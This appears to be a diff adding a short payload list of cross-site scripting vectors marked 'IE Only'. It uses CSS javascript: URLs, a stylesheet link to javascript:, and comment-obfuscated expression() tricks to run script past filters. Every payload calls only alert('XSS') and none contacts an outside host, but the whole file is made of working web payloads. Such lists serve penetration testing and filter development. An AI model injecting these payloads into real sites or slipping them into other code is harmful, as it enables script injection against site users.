@@ -1,0 +1,17 @@
+IE Only: 
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+exp/*<A STYLE='no\xss:noxss("*//*");
+
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+<XSS STYLE="xss:expression(alert('XSS'))">
